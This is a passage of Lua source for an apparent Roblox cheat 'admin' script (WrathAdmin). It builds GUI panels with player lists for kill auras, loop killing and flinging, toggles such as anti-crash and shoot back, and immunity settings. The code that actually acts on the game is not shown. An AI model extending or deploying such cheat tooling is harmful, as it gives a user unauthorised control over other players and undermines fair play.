MainGuiObjects.TextButton_2.MouseButton1Click:Connect(function()
    ShowPlayers("Admins", Admins);
end);

MainGuiObjects.TextButton_3.MouseButton1Click:Connect(function()
    local Invis = {};
    for _,CHAR in pairs(workspace:GetChildren()) do
        local Player = Players:FindFirstChild(CHAR.Name)
        if Player then
            local Head = CHAR:FindFirstChild("Head")
            if Head then
                if Head.Position.Y > 5000 or Head.Position.X > 99999 then
                    table.insert(Invis, Player);
                end
            end
        end
    end
    ShowPlayers("Invisible", Invis);
end);

MainGuiObjects.TextButton_4.MouseButton1Click:Connect(function()
    ShowPlayers("Kill Auras", KillAuras);
end);

MainGuiObjects.TextButton_5.MouseButton1Click:Connect(function()
    ShowPlayers("Tase Auras", TaseAuras)
end)

MainGuiObjects.TextButton_6.MouseButton1Click:Connect(function()
    ShowPlayers("Loop Killing", Loopkilling);
end);

MainGuiObjects.TextButton_7.MouseButton1Click:Connect(function()
    ShowPlayers("Loop Tasing", LoopTasing);
end);

MainGuiObjects.TextButton_8.MouseButton1Click:Connect(function()
    ShowPlayers("Infected", Infected);
end);

MainGuiObjects.TextButton_9.MouseButton1Click:Connect(function()
    ShowPlayers("Protected", Protected);
end);

MainGuiObjects.GetFlingers.MouseButton1Click:Connect(function()
    local Flingers = {};
    local ValidParts = {}
    for _,CHAR in pairs(workspace:GetChildren()) do
        if Players:FindFirstChild(CHAR.Name) then
            for _,object in pairs(CHAR:GetChildren()) do
                ValidParts[object.Name] = object;
            end
            if not ValidParts["Torso"] and not ValidParts["Head"] then
                local Player = Players:FindFirstChild(CHAR.Name)
                if Player then
                    table.insert(Flingers, Player);
                end;
            end
            ValidParts = {}
        end
    end

    ShowPlayers("Invis Flingers", Flingers);
end);

MainGuiObjects.GetOnePunchers.MouseButton1Click:Connect(function()
    ShowPlayers("One Punch", Onepunch);
end);

MainGuiObjects.GetAntiShoots.MouseButton1Click:Connect(function()
    ShowPlayers("Shoot Back", AntiShoots);
end);

MainGuiObjects.GetClickTeleports.MouseButton1Click:Connect(function()
    ShowPlayers("Click Teleport", ClickTeleports);
end);
MainGuiObjects.GetTaseBack.MouseButton1Click:Connect(function()
    ShowPlayers("Tase Back", TaseBacks);
end);

MainGuiObjects.UIListLayout_3.Parent = MainGuiObjects.PlayerListFrame
MainGuiObjects.UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
MainGuiObjects.UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_3.Padding = UDim.new(0, 5)

MainGuiObjects.UICorner_13.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_13.Parent = MainGuiObjects.TextButton_10

MainGuiObjects.PlayerListRound_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_3.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_3.Parent = MainGuiObjects.PlayerList

MainGuiObjects.Toggles.Name = "Toggles"
MainGuiObjects.Toggles.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.Toggles.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.Toggles.BorderSizePixel = 0
MainGuiObjects.Toggles.Position = UDim2.new(0.727664113, -605, 0.0156493802, 479)
MainGuiObjects.Toggles.Size = UDim2.new(0, 242, 0, 237)
makeDraggable(MainGuiObjects.Toggles);

MainGuiObjects.TogglesTopbar.Name = "TogglesTopbar"
MainGuiObjects.TogglesTopbar.Parent = MainGuiObjects.Toggles
MainGuiObjects.TogglesTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TogglesTopbar.BorderSizePixel = 0
MainGuiObjects.TogglesTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_3.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_3.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_3.Parent = MainGuiObjects.TogglesTopbar

MainGuiObjects.TogglesTitle.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle.Parent = MainGuiObjects.TogglesTopbar
MainGuiObjects.TogglesTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle.Text = "Toggles"
MainGuiObjects.TogglesTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle.TextSize = 31.000

MainGuiObjects.PlayerListRound_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_4.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_4.Parent = MainGuiObjects.Toggles

MainGuiObjects.TogglesListFrame.Name = "TogglesListFrame"
MainGuiObjects.TogglesListFrame.Parent = MainGuiObjects.Toggles
MainGuiObjects.TogglesListFrame.Active = true
MainGuiObjects.TogglesListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.TogglesListFrame.BorderSizePixel = 0
MainGuiObjects.TogglesListFrame.Position = UDim2.new(0.0371900834, 0, 0.160976171, 0)
MainGuiObjects.TogglesListFrame.Size = UDim2.new(0, 225, 0, 192)
MainGuiObjects.TogglesListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout_4.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_4.Padding = UDim.new(0, 5)

MainGuiObjects.Toggle.Name = "Toggle"
MainGuiObjects.Toggle.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle.BorderSizePixel = 0
MainGuiObjects.Toggle.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle.Font = Enum.Font.Code
MainGuiObjects.Toggle.Text = " Anti-Crash"
MainGuiObjects.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle.TextSize = 14.000
MainGuiObjects.Toggle.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "acrash");
    ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
    if States.AntiCrash then
        ChangeGuiToggle(false, "Shoot Back");
        ChangeGuiToggle(false, "Tase Back");
    end;
end);

MainGuiObjects.UICorner_14.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_14.Parent = MainGuiObjects.Toggle

MainGuiObjects.TextLabel_4.Parent = MainGuiObjects.Toggle
MainGuiObjects.TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_4.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_4.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_4.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_4.Font = Enum.Font.Code
MainGuiObjects.TextLabel_4.Text = "true"
MainGuiObjects.TextLabel_4.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_4.TextSize = 14.000

MainGuiObjects.Toggle_2.Name = "Toggle"
MainGuiObjects.Toggle_2.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_2.BorderSizePixel = 0
MainGuiObjects.Toggle_2.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_2.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_2.Font = Enum.Font.Code
MainGuiObjects.Toggle_2.Text = " Anti-Bring"
MainGuiObjects.Toggle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_2.TextSize = 14.000
MainGuiObjects.Toggle_2.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_2.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ab");
    ChangeGuiToggle(States.AntiBring, "Anti-Bring");
end);

MainGuiObjects.UICorner_15.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_15.Parent = MainGuiObjects.Toggle_2

MainGuiObjects.TextLabel_5.Parent = MainGuiObjects.Toggle_2
MainGuiObjects.TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_5.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_5.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_5.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_5.Font = Enum.Font.Code
MainGuiObjects.TextLabel_5.Text = "false"
MainGuiObjects.TextLabel_5.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_5.TextSize = 14.000

MainGuiObjects.Toggle_3.Name = "Toggle"
MainGuiObjects.Toggle_3.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_3.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_3.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_3.BorderSizePixel = 0
MainGuiObjects.Toggle_3.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_3.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_3.Font = Enum.Font.Code
MainGuiObjects.Toggle_3.Text = " Shoot Back"
MainGuiObjects.Toggle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_3.TextSize = 14.000
MainGuiObjects.Toggle_3.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_3.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "sb");
    ChangeGuiToggle(States.ShootBack, "Shoot Back");
end);

MainGuiObjects.TextLabel_6.Parent = MainGuiObjects.Toggle_3
MainGuiObjects.TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_6.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_6.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_6.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_6.Font = Enum.Font.Code
MainGuiObjects.TextLabel_6.Text = "false"
MainGuiObjects.TextLabel_6.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_6.TextSize = 14.000

MainGuiObjects.UICorner_16.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_16.Parent = MainGuiObjects.Toggle_3

MainGuiObjects.TaseBackToggle = Instance.new("TextButton");
MainGuiObjects.TaseBackToggle.Name = "Toggle"
MainGuiObjects.TaseBackToggle.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.TaseBackToggle.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.TaseBackToggle.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TaseBackToggle.BorderSizePixel = 0
MainGuiObjects.TaseBackToggle.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.TaseBackToggle.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.TaseBackToggle.Font = Enum.Font.Code
MainGuiObjects.TaseBackToggle.Text = " Tase Back"
MainGuiObjects.TaseBackToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TaseBackToggle.TextSize = 14.000
MainGuiObjects.TaseBackToggle.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.TaseBackToggle.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "tb");
    ChangeGuiToggle(States.TaseBack, "Tase Back");
end);

MainGuiObjects.UICorner_16.CornerRadius = UDim.new(0, 5);
MainGuiObjects.UICorner_16.Parent = MainGuiObjects.TaseBackToggle

MainGuiObjects.TBTextToggle = Instance.new("TextLabel")
MainGuiObjects.TBTextToggle.Parent = MainGuiObjects.TaseBackToggle
MainGuiObjects.TBTextToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TBTextToggle.BackgroundTransparency = 1.000
MainGuiObjects.TBTextToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TBTextToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TBTextToggle.Font = Enum.Font.Code
MainGuiObjects.TBTextToggle.Text = "false"
MainGuiObjects.TBTextToggle.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TBTextToggle.TextSize = 14.000

MainGuiObjects.Toggle_4.Name = "Toggle"
MainGuiObjects.Toggle_4.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_4.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_4.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_4.BorderSizePixel = 0
MainGuiObjects.Toggle_4.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_4.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_4.Font = Enum.Font.Code
MainGuiObjects.Toggle_4.Text = " Anti-Fling"
MainGuiObjects.Toggle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_4.TextSize = 14.000
MainGuiObjects.Toggle_4.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_4.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "afling");
    ChangeGuiToggle(States.AntiFling, "Anti-Fling");
end);

MainGuiObjects.UICorner_17.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_17.Parent = MainGuiObjects.Toggle_4

MainGuiObjects.TextLabel_7.Parent = MainGuiObjects.Toggle_4
MainGuiObjects.TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_7.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_7.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_7.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_7.Font = Enum.Font.Code
MainGuiObjects.TextLabel_7.Text = "false"
MainGuiObjects.TextLabel_7.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_7.TextSize = 14.000

MainGuiObjects.Toggle_5.Name = "Toggle"
MainGuiObjects.Toggle_5.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_5.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_5.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_5.BorderSizePixel = 0
MainGuiObjects.Toggle_5.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_5.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_5.Font = Enum.Font.Code
MainGuiObjects.Toggle_5.Text = " Anti-Punch"
MainGuiObjects.Toggle_5.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_5.TextSize = 14.000
MainGuiObjects.Toggle_5.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_5.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ap");
    ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
end);

MainGuiObjects.UICorner_18.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_18.Parent = MainGuiObjects.Toggle_5

MainGuiObjects.TextLabel_8.Parent = MainGuiObjects.Toggle_5
MainGuiObjects.TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_8.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_8.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_8.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_8.Font = Enum.Font.Code
MainGuiObjects.TextLabel_8.Text = "false"
MainGuiObjects.TextLabel_8.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_8.TextSize = 14.000

MainGuiObjects.Toggle_6.Name = "Toggle"
MainGuiObjects.Toggle_6.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.Toggle_6.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_6.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_6.BorderSizePixel = 0
MainGuiObjects.Toggle_6.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_6.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_6.Font = Enum.Font.Code
MainGuiObjects.Toggle_6.Text = " Anti-Criminal"
MainGuiObjects.Toggle_6.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_6.TextSize = 14.000
MainGuiObjects.Toggle_6.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_6.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "ac");
    ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
end);

-- last minute too
MainGuiObjects.AutoRespawn = Instance.new("TextButton")
MainGuiObjects.AutoRespawn.Name = "Toggle"
MainGuiObjects.AutoRespawn.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.AutoRespawn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AutoRespawn.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.AutoRespawn.BorderSizePixel = 0
MainGuiObjects.AutoRespawn.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.AutoRespawn.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.AutoRespawn.Font = Enum.Font.Code
MainGuiObjects.AutoRespawn.Text = " Auto-Respawn"
MainGuiObjects.AutoRespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoRespawn.TextSize = 14.000
MainGuiObjects.AutoRespawn.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.AutoRespawn.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "auto");
    ChangeGuiToggle(States.AutoRespawn, "Auto-Respawn");
end);

MainGuiObjects.AutoRespawnToggle = Instance.new("TextLabel");
MainGuiObjects.AutoRespawnToggle.Parent = MainGuiObjects.AutoRespawn
MainGuiObjects.AutoRespawnToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoRespawnToggle.BackgroundTransparency = 1.000
MainGuiObjects.AutoRespawnToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.AutoRespawnToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.AutoRespawnToggle.Font = Enum.Font.Code
MainGuiObjects.AutoRespawnToggle.Text = "false"
MainGuiObjects.AutoRespawnToggle.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.AutoRespawnToggle.TextSize = 14.000

MainGuiObjects.ARRound = Instance.new("UICorner")
MainGuiObjects.ARRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ARRound.Parent = MainGuiObjects.AutoRespawn

MainGuiObjects.AutoTeamChange = Instance.new("TextButton")
MainGuiObjects.AutoTeamChange.Name = "Toggle"
MainGuiObjects.AutoTeamChange.Parent = MainGuiObjects.TogglesListFrame
MainGuiObjects.AutoTeamChange.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.AutoTeamChange.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.AutoTeamChange.BorderSizePixel = 0
MainGuiObjects.AutoTeamChange.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.AutoTeamChange.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.AutoTeamChange.Font = Enum.Font.Code
MainGuiObjects.AutoTeamChange.Text = " Auto Team Change"
MainGuiObjects.AutoTeamChange.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.AutoTeamChange.TextSize = 14.000
MainGuiObjects.AutoTeamChange.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.AutoTeamChange.MouseButton1Click:Connect(function()
    UseCommand(Settings.Prefix .. "atc");
    ChangeGuiToggle(States.AutoTeamChange, "Auto Team Change");
end);

MainGuiObjects.ATCToggle = Instance.new("TextLabel");
MainGuiObjects.ATCToggle.Parent = MainGuiObjects.AutoTeamChange
MainGuiObjects.ATCToggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.ATCToggle.BackgroundTransparency = 1.000
MainGuiObjects.ATCToggle.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.ATCToggle.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.ATCToggle.Font = Enum.Font.Code
MainGuiObjects.ATCToggle.Text = "true"
MainGuiObjects.ATCToggle.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.ATCToggle.TextSize = 14.000

MainGuiObjects.ATCRound = Instance.new("UICorner")
MainGuiObjects.ATCRound.CornerRadius = UDim.new(0, 5)
MainGuiObjects.ATCRound.Parent = MainGuiObjects.AutoTeamChange

function ChangeGuiToggle(State, Name)
    for i,v in pairs(MainGuiObjects.TogglesListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

function ChangeImmunityToggle(State, Name)
    for i,v in pairs(MainGuiObjects.ImmunityListFrame:GetChildren()) do
        if v:IsA("TextButton") then
            if v.Text == " " .. Name then
                if State then
                    v:FindFirstChildWhichIsA("TextLabel").Text = "true";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(85, 255, 0)
                else
                    v:FindFirstChildWhichIsA("TextLabel").Text = "false";
                    v:FindFirstChildWhichIsA("TextLabel").TextColor3 = Color3.fromRGB(255, 0, 0);
                end;
            end;
        end;
    end;
end;

MainGuiObjects.UICorner_19.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_19.Parent = MainGuiObjects.Toggle_6

MainGuiObjects.TextLabel_9.Parent = MainGuiObjects.Toggle_6
MainGuiObjects.TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_9.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_9.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_9.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_9.Font = Enum.Font.Code
MainGuiObjects.TextLabel_9.Text = "false"
MainGuiObjects.TextLabel_9.TextColor3 = Color3.fromRGB(255, 0, 0)
MainGuiObjects.TextLabel_9.TextSize = 14.000

MainGuiObjects.ImmunitySettings.Name = "ImmunitySettings"
MainGuiObjects.ImmunitySettings.Parent = MainGuiObjects.WrathAdminGuiMain
MainGuiObjects.ImmunitySettings.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.ImmunitySettings.BorderSizePixel = 0
MainGuiObjects.ImmunitySettings.Position = UDim2.new(0.727664113, -354, 0.402190834, -235)
MainGuiObjects.ImmunitySettings.Size = UDim2.new(0, 242, 0, 241)
makeDraggable(MainGuiObjects.ImmunitySettings);

MainGuiObjects.ImmunityTopbar.Name = "ImmunityTopbar"
MainGuiObjects.ImmunityTopbar.Parent = MainGuiObjects.ImmunitySettings
MainGuiObjects.ImmunityTopbar.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.ImmunityTopbar.BorderSizePixel = 0
MainGuiObjects.ImmunityTopbar.Size = UDim2.new(0, 242, 0, 31)

MainGuiObjects.TemplateTopbarRound_4.CornerRadius = UDim.new(0, 5)
MainGuiObjects.TemplateTopbarRound_4.Name = "TemplateTopbarRound"
MainGuiObjects.TemplateTopbarRound_4.Parent = MainGuiObjects.ImmunityTopbar

MainGuiObjects.TogglesTitle_2.Name = "TogglesTitle"
MainGuiObjects.TogglesTitle_2.Parent = MainGuiObjects.ImmunityTopbar
MainGuiObjects.TogglesTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_2.BackgroundTransparency = 1.000
MainGuiObjects.TogglesTitle_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.TogglesTitle_2.Size = UDim2.new(0, 242, 0, 31)
MainGuiObjects.TogglesTitle_2.Font = Enum.Font.Code
MainGuiObjects.TogglesTitle_2.Text = "Immunity Settings"
MainGuiObjects.TogglesTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TogglesTitle_2.TextSize = 24.000

MainGuiObjects.PlayerListRound_5.CornerRadius = UDim.new(0, 5)
MainGuiObjects.PlayerListRound_5.Name = "PlayerListRound"
MainGuiObjects.PlayerListRound_5.Parent = MainGuiObjects.ImmunitySettings

MainGuiObjects.ImmunityListFrame.Name = "ImmunityListFrame"
MainGuiObjects.ImmunityListFrame.Parent = MainGuiObjects.ImmunitySettings
MainGuiObjects.ImmunityListFrame.Active = true
MainGuiObjects.ImmunityListFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
MainGuiObjects.ImmunityListFrame.BorderSizePixel = 0
MainGuiObjects.ImmunityListFrame.Position = UDim2.new(0.0371900834, 0, 0.164775416, 0)
MainGuiObjects.ImmunityListFrame.Size = UDim2.new(0, 225, 0, 192)
MainGuiObjects.ImmunityListFrame.ScrollBarThickness = 1

MainGuiObjects.UIListLayout_5.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
MainGuiObjects.UIListLayout_5.Padding = UDim.new(0, 5)

MainGuiObjects.Toggle_7.Name = "Toggle"
MainGuiObjects.Toggle_7.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_7.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_7.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_7.BorderSizePixel = 0
MainGuiObjects.Toggle_7.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_7.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_7.Font = Enum.Font.Code
MainGuiObjects.Toggle_7.Text = " Kill Commands"
MainGuiObjects.Toggle_7.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_7.TextSize = 14.000
MainGuiObjects.Toggle_7.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_7.MouseButton1Click:Connect(function()
    ProtectedSettings.killcmds = not ProtectedSettings.killcmds;
    ChangeImmunityToggle(ProtectedSettings.killcmds, "Kill Commands");
end);

MainGuiObjects.UICorner_20.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_20.Parent = MainGuiObjects.Toggle_7

MainGuiObjects.TextLabel_10.Parent = MainGuiObjects.Toggle_7
MainGuiObjects.TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.TextLabel_10.BackgroundTransparency = 1.000
MainGuiObjects.TextLabel_10.Position = UDim2.new(0.800000012, 0, 0, 0)
MainGuiObjects.TextLabel_10.Size = UDim2.new(0, 45, 0, 25)
MainGuiObjects.TextLabel_10.Font = Enum.Font.Code
MainGuiObjects.TextLabel_10.Text = "true"
MainGuiObjects.TextLabel_10.TextColor3 = Color3.fromRGB(85, 255, 0)
MainGuiObjects.TextLabel_10.TextSize = 14.000

MainGuiObjects.Toggle_8.Name = "Toggle"
MainGuiObjects.Toggle_8.Parent = MainGuiObjects.ImmunityListFrame
MainGuiObjects.Toggle_8.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
MainGuiObjects.Toggle_8.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainGuiObjects.Toggle_8.BorderSizePixel = 0
MainGuiObjects.Toggle_8.Position = UDim2.new(0, 0, 2.66529071e-07, 0)
MainGuiObjects.Toggle_8.Size = UDim2.new(0, 225, 0, 25)
MainGuiObjects.Toggle_8.Font = Enum.Font.Code
MainGuiObjects.Toggle_8.Text = " Teleport Commands"
MainGuiObjects.Toggle_8.TextColor3 = Color3.fromRGB(255, 255, 255)
MainGuiObjects.Toggle_8.TextSize = 14.000
MainGuiObjects.Toggle_8.TextXAlignment = Enum.TextXAlignment.Left
MainGuiObjects.Toggle_8.MouseButton1Click:Connect(function()
    ProtectedSettings.tpcmds = not ProtectedSettings.tpcmds;
    ChangeImmunityToggle(ProtectedSettings.tpcmds, "Teleport Commands");
end);

MainGuiObjects.UICorner_21.CornerRadius = UDim.new(0, 5)
MainGuiObjects.UICorner_21.Parent = MainGuiObjects.Toggle_8

MainGuiObjects.TextLabel_11.Parent = MainGuiObjects.Toggle_8
